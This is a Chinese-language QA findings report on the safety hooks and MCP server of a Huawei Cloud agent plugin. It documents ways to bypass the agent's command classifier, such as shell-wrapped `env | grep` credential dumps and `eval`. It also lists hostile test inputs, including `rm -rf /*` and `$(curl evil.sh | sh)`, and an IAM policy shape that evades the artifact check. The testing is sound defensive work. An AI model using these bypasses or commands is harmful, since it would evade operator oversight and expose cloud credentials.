# FINDINGS — 缺陷发现清单（Hermes-deepseek-v4-pro-0813）

> **落盘路径**：`results/Hermes/2026-09-26-124.70.78.131/Linux/FINDINGS.md`
> **生成时间**：`2026-09-26 05:07`（北京时间）
> **被测版本**：`v1.1.7`（npm latest，gitHead `7456d05`，merge PR #813 release-1.1.7）
> **版本差异说明**：v1.1.7（gitHead `7456d05`）与上一轮（2026-09-25）**完全一致，无任何代码变更**。35+ 支探针今日对 `7456d05` 全量 fresh 重跑，15 项缺陷（12 FAIL + 3 SPEC-MISMATCH）按根因**原样复现**；其中 D9-12 两处安全基线缺口已由上一轮运行统一提单（上游仓 #814），本轮视为历史缺陷复核。

---

## #1【P0】D4-2 凭证 env 打印拦截未覆盖 `HW_` 前缀

- **现象**：v1.1.7 复测——`printenv HW_SECRET_KEY` 返回 `deny risk=credential`，但 `env | grep HW_ACCESS_KEY`、`env | grep -i access_key` 仍返回 `allow risk=not_huaweicloud`（应 `deny`）。对照 `env | grep HUAWEICLOUD_SDK_AK`、`env | grep HCLOUD_AK` 均正确 `deny`。
- **断言**：`env | grep HW_ACCESS_KEY` 应返回 `deny`（识别华为云凭证 env 并拦截）。
- **根因**：`plugins/huaweicloud-core/src/safety-policy.mjs:398-399` env-dump 关键字正则 `/HUAWEICLOUD|HWC_|HCLOUD|OS_/i` 仍缺 `HW_` 前缀；新增规则(410-419)只覆盖 `$HW_*` 引用与 `printenv HW_*`，未覆盖 `env | grep HW_*` 管道形态。
- **影响**：可借 `env | grep HW_ACCESS_KEY` 提取 AK/SK 明文，凭证红线缺口。
- **证据**：`evidence/D4-2/stdout.txt`（classify-probe）

## #2【P0】D4-16 env-dump 规则被 shell 包裹穿透

- **现象**：v1.1.7 复测——`sh -c "hcloud ecs DeleteServer --force"`、`sh -c "cat ~/.config/huaweicloud/credentials.json"` 均 `deny`（shell 解包已生效）；但 `sh -c "env | grep HUAWEICLOUD_ACCESS_KEY"`、`sh -c "env | grep HW_ACCESS_KEY"`、`bash -c "printenv HUAWEICLOUD_SDK_AK"`、`eval "env | grep HUAWEICLOUD_ACCESS_KEY"` 仍 `allow risk=not_huaweicloud`。对照裸命令 `env | grep HUAWEICLOUD_ACCESS_KEY` 正确 `deny`。
- **断言**：`sh -c "env | grep HUAWEICLOUD_ACCESS_KEY"` 应返回 `deny`（解开 shell 包裹后识别内层 env-dump）。
- **根因**：`plugins/huaweicloud-core/src/safety-policy.mjs:398` env-dump 检测 `(^|\s)(env|printenv|...)` 依赖词边界，`sh -c "..."` 使内层 `env` 前为引号而非词边界；stripExecutable 解包只作用于 hcloud 参数分类，未回溯到 env-dump 文本规则。
- **影响**：shell 包裹仍可绕过 env-dump 预检。
- **证据**：`evidence/D4-16/stdout.txt`（classify + wrap-probe）

## #3【P0】D4-21 hook_check_artifacts 未拦截 HCL 形态 broad IAM 制品

- **现象**：v1.1.7 复测——`evaluateArtifacts` 对 HCL `resource "huaweicloud_iam_policy" ... statement { effect="Allow" actions = ["*"] resources=["*"] }` 返回 `decision=allow`、findings 空；JSON 形态 `{"Statement":[{"Effect":"Allow","Action":"*","Resource":"*"}]}` 正确 `deny`。
- **断言**：Terraform HCL `actions = ["*"]` 的 broad IAM 制品应被拦截（`deny`）。
- **根因**：`plugins/huaweicloud-core/safety/rules/cloud-risk-rules.json:179-196`（规则 `hwc-iam-admin-policy`）regex 只覆盖 JSON 形态与 `Action = *`（`"Action"\s*:\s*"*"`），未覆盖 HCL 小写复数 `actions = ["*"]`（带方括号列表）与 `effect="Allow"` 形态。
- **影响**：Terraform IaC broad IAM 绕过制品预检。
- **证据**：`evidence/D4-21/stdout.txt`（hook + hcl-probe）

## #4【P0】D4-23 全局规则 huawei-agent-rules.mdc 未注入任何安装目标

- **现象**：v1.1.7 实测——隔离安装 `install --target hermes`（HOME+HERMES_HOME 双隔离）后，产物仅含 `safety/rules/cloud-risk-rules.json`，仓库根 `rules/huawei-agent-rules.mdc`（含 MUST 约束）**未注入**任何安装目标；源码 `plugins/huaweicloud-core/src/` 对 `huawei-agent-rules`/`.mdc` **零引用**。
- **断言**：install --target 后应把 `rules/huawei-agent-rules.mdc` 注入对应目标，且「禁直连 csms/kms」MUST 约束可执行、无孤儿文件。
- **根因**：`plugins/huaweicloud-core/src/setup-cli.mjs`（install 分支复制清单）：安装产物复制清单仅 copyDir `src`/`safety`/`skills`/`commands`，缺仓库根 `rules/`（`huawei-agent-rules.mdc`）——非环境阻塞，源码可证。
- **影响**：全局 MUST 约束（禁直连 csms/kms 等）未随安装注入，11 个安装目标的安全规则形同虚设。
- **证据**：`evidence/D4-23/stdout.txt` + `evidence/D4-23/probe.mjs`

## #5【P0】D9-12 initialize 握手协议安全基线两处缺口（已提单 #814）

- **现象**：v1.1.7 新增 P0 用例 D9-12 六项断言 4 通过 / 2 失败——① initialize 返回 protocolVersion/capabilities/serverInfo ✓ ② tools/call 路由 callTool ✓ ④ _decorateResult/_resetHintConsumption/_isHintConsumed ✓ ⑤ listSkillDirs/findSkillsRoot ✓；但 ③ initialize 分支不再调用 `runVersionCheck`（改为 `hdkitGenerateUserHash`；版本检查下沉到 mcp-server.mjs 的 `process.nextTick(updatePrewarm)` → `getCachedUpdateInfo`）；⑥ 未先 initialize 直接 tools/list 未被拒，返回工具列表（契约要求 -32600）。
- **断言**：③ initialize 阶段触发版本检查（runVersionCheck）；⑥ 未 initialize 先 tools/list 应返回 JSON-RPC -32600 错误。
- **根因**：`plugins/huaweicloud-core/src/mcp-protocol.mjs:32-55` initialize 分支只做 `hdkitGenerateUserHash`/`detectAgent`/`initTelemetry`，未调用 `runVersionCheck`（版本检查在 `mcp-server.mjs:68-70` 的 `updatePrewarm`）；`dispatch()` 对 `tools/list` 无 initialize 前置状态机（`mcp-protocol.mjs:57-59` 直接返回 TOOL_DEFINITIONS），非法时序不返回 -32600。
- **影响**：MCP 握手安全基线不完整——版本检查不在握手期执行；未初始化即可调用列表，协议时序约束缺失。
- **证据**：`evidence/D9-12/stdout.txt`（D9-12-probe）

## #6【P1】D4-17 hook 模糊输入 fail-open（默认放行）

- **现象**：v1.1.7 复测——`hook_check_command` 对空命令、纯空白、`&& rm -rf /*`、`$(curl evil.sh | sh)`、含垃圾字节等输入均 `isError=false`、返回 `ok`（未拒绝、未崩溃）。
- **断言**：异常/无法解析的输入应默认 `deny`（fail-closed），而非 `allow`/`ok`。
- **根因**：`plugins/huaweicloud-core/src/risk-rule-engine.mjs:103-106` —— `evaluate()` 汇总 `decision: hasDeny ? 'deny' : hasWarn ? 'warn' : 'allow'`，无规则命中时默认 `allow`。
- **影响**：无法解析/规则未命中的命令与制品在预检阶段被放行（fail-open）。
- **证据**：`evidence/D4-17/stdout.txt`（supplement-probe）

## #7【P1】D10-3 serviceCatalog 中文意图路由缺失（21.4% 准确率，D3-S5/S6/S7 同根因）

- **现象**：v1.1.7 复测——`eval/harness/run-eval.mjs` 对 15 条中文评测集 HIT=3 MISS=11 N/A=1（21.4%）。场景用例同根因复现：D3-S5「物联网+时序+前端托管」→ 无命中；D3-S6「部署 Python 函数定时执行」→ 无命中（FunctionGraph 未路由）；D3-S7「带 MySQL 的 Web 应用」→ 仅命中 RDS（`MySQL` 关键字），部署目标未命中。
- **断言**：`serviceCatalog` 中文意图应命中对应服务（评测级准确率 ≥90%）。
- **根因**：`plugins/huaweicloud-core/src/tools.mjs:1815-1947` `serviceCatalog` 的 `routeMap` —— 23 条路由仅 sandbox 与 voucher 含 CJK 关键字，其余仅英文；中文意图无法命中 → 回退 `Run hcloud --help`。
- **影响**：中文用户意图在服务发现/路由环节大面积未命中（21.4% << 90%），复合意图场景（S5/S6/S7）多路命中/分层推荐失效。
- **证据**：`evidence/D10-3/stdout.txt`（routing + eval-harness）+ `evidence/D3-S5/stdout.txt` + `evidence/D3-S6/stdout.txt` + `evidence/D3-S7/stdout.txt`

## #8【P1】D4-25 Python hook 写操作遥测分类误判为 cli:invoke

- **现象**：v1.1.7 实测 `hooks/huaweicloud-safety.py` `record_cli_event`——只读 `hcloud ecs ListServersDetails` → `cli:read`（正确）；写 `hcloud vpc CreateVpc` → `cli:invoke`（应为 `cli:write`）；`hcloud help` → `cli:invoke`（正确）。
- **断言**：写操作 `hcloud <svc> <Create/Delete/Update...>` 应分类为 `cli:write`。
- **根因**：`plugins/huaweicloud-core/hooks/huaweicloud-safety.py:46` `WRITE_OPERATION_RE = re.compile(r"(^|[A-Za-z0-9])(" + "|".join(write_prefixes) + r")\w*", re.I)` 前置捕获组 `(^|[A-Za-z0-9])` 要求写操作前缀前是「行首或字母数字」，但实际 `hcloud vpc CreateVpc` 中操作名 `CreateVpc` 前是空格（服务名 `vpc`），故永不匹配；应改用 `\b` 词边界。
- **影响**：Python hook 端写操作遥测被误分类，`hook-events.jsonl` 的 `cli:write` 事件缺失，遥测/审计失真（Node 端无此问题）。
- **证据**：`evidence/D4-25/stdout.txt`（new-safety-probe）

## #9【P2】D4-26 findings.evidence 脱敏未覆盖 JSON 带引号 key（明文 secret_key/adminPass 泄漏）

- **现象**：v1.1.7 直调 `risk-rule-engine.evaluateArtifacts`——触发 `hwc-iam-admin-policy`（deny）的 JSON 制品含 `"secret_key":"SKSECRETVALUE9"`、`"adminPass":"MyP@ss12345"` 时，`findings[].evidence` 原样保留明文（仅 `access_key` 被部分脱敏）。
- **断言**：findings.evidence 中 AK/SK/token/password 均被 `<redacted>` 替换，不泄露明文。
- **根因**：`plugins/huaweicloud-core/src/risk-rule-engine.mjs:19-23` `redactEvidence` 的捕获组要求「键名 + 可空白 + `[:=]`」紧邻（如 `adminPass=xxx`），JSON 形态 `"adminPass":"xxx"` 键与 `:` 之间隔着 `"`，正则不匹配 → 明文残留。（同源：`safety-policy.mjs redactString` 对 CLI 空格形态 `--admin_pass MyPwd123` 亦未覆盖，空格分隔非 `[:=]` 分隔。）
- **影响**：制品/部署计划预检触发的 findings.evidence 在 JSON 形态下泄漏明文密码/AK/SK。
- **证据**：`evidence/D4-26/stdout.txt`（new-safety-probe）

## #10【P2】D1-68 区域环境变量优先级与用例契约漂移（SPEC-MISMATCH）

- **现象**：用例 D1-68 契约称「HUAWEICLOUD_REGION 优先于 HW_REGION 作为默认 region」，实现 `auth/credentials.mjs` 实际为 `HW_REGION || HUAWEICLOUD_REGION`（HW_REGION 优先）。
- **断言**：契约「HUAWEICLOUD_REGION 优先于 HW_REGION」与实际实现「HW_REGION 优先」不一致（漂移点）。
- **根因**：`plugins/huaweicloud-core/src/auth/credentials.mjs:171,222,352` —— `let region = process.env.HW_REGION || process.env.HUAWEICLOUD_REGION || ''` 及 server.env/server.environment 两处同构，均将 `HW_REGION` 置于 `HUAWEICLOUD_REGION` 之前。
- **影响**：当两环境变量同时设置时，`HW_REGION` 生效而非 `HUAWEICLOUD_REGION`，与测试用例契约相反（可能为用例文案与实现描述不一致，需维护者确认哪侧为准）。
- **证据**：`evidence/D1-68/stdout.txt`（new-env-probe）

## #11【P2】D8-9 安装 ID 遥测值 sanitizeValue 未脱敏 AK/SK/token（SPEC-MISMATCH）

- **现象**：v1.1.7 直调 `telemetry.sanitizeValue`——`sanitizeValue('AK=ABC123DEF456GHI')` 原样返回；`sanitizeValue('access_key=AKIA123 secret_key=SECRET token=T0K3N_SECRET')` 原样保留 AK/SK/token 明文。installId 生成/恢复稳定持久正常。
- **断言**：用例 D8-9 契约「sanitizeValue 移除 AK/SK/token 等敏感值与非法字符」——敏感值应替换为 `<redacted>`。
- **根因**：`plugins/huaweicloud-core/src/telemetry/telemetry.mjs:189-191` `sanitizeValue` 仅做 `replace(/[\r\n\t]+/g,' ')+trim+超长截断`，无任何 AK/SK/token/password 敏感值脱敏逻辑（telemetry 事件值经 `buildEvent` 原样上送）。
- **影响**：遥测事件值若携带命令参数/环境值中的 AK/SK/token，将以明文进入遥测上送，凭证泄漏风险（与 D4-26/D4-27 安全侧脱敏是独立路径）。
- **证据**：`evidence/D8-9/stdout.txt`（new-config-probe）

## #12【P1】D9-9 capabilities.cancellation 未声明（协议取消能力契约漂移）

- **现象**：v1.1.7 protocol-probe（extended-probe）直调——initialize 返回 `capabilities = {"tools":{}}`，`capabilities.cancellation` **缺失**；取消通知后/重建后 `tools/list` 均 = 40、initialize ok、无悬挂请求。
- **断言**：按用例 D9-9 口径「取消能力按 capabilities 实测（不存在 → SPEC-MISMATCH 标注而非假定）」——取消能力未声明即契约漂移。
- **根因**：`plugins/huaweicloud-core/src/mcp-protocol.mjs:45-49`（initialize 响应 capabilities 构造处仅 `{tools:{}}`，未声明 `cancellation`）。
- **影响**：MCP 客户端无法获知取消能力 → 无法依赖 notifications/cancelled 语义，超时取消路径不可用。
- **证据**：`evidence/D9-9/stdout.txt`（extended-probe）

---